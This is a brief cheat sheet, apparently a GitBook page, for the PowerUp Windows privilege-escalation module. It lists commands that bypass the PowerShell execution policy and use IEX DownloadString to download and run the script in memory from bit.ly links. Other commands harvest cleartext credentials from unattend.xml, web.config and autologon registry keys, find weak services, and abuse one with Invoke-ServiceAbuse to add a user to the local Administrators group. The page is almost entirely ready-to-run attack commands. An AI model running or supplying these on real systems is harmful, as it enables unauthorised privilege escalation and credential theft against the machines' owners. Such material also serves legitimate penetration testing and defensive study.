# Powerup

## Initial Execution

```bash
# Load from disk
Powershell.exe -nop -exec bypass
. .\powerup.ps1

# Load from Github
Powershell IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/1PdjSHk")

# Invoke-AllChecks
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt

# Invoke-AllChecks and load script in one command
powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}

# Invoke-AllChecks without touching disk
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
```

## Commands

### Miscellaneous

```bash
# Check for credentials in unattend.xml files
Get-UnattendedInstallFile

# Get cleartext credentials and encrypted strings from web config files
Get-Webconfig

# Get current user tokens and privileges
Get-ProcessTokenPrivilege
```

### Services

```bash
# Get services with unquoted paths and spaces
Get-ServiceUnquoted -Verbose

# Get services where current user can write to binary path
Get-ModifiableServiceFile -Verbose

#Get the services whose configuration the current user can modify
Get-ModifiableService -Verbose

# Exploit vulnerable service 
Invoke-ServiceAbuse -Name "Vuln-Service" -Command "net localgroup Administrators security.local\moe /add"
```

### Registry

```bash
# Checks if MSI files are always installed in context of SYSTEM
Get-RegistryAlwaysInstallElevated

# Checks if any autologon credentials exists in registry locations
Get-RegistryAutologon

# Gets autoruns where the current user can modify the script or binary
Get-ModifiableRegistryAutoRun
```

## References

{% embed url="https://blog.certcube.com/powerup-cheatsheet/" %}

{% embed url="https://powersploit.readthedocs.io/en/latest/#overview" %}





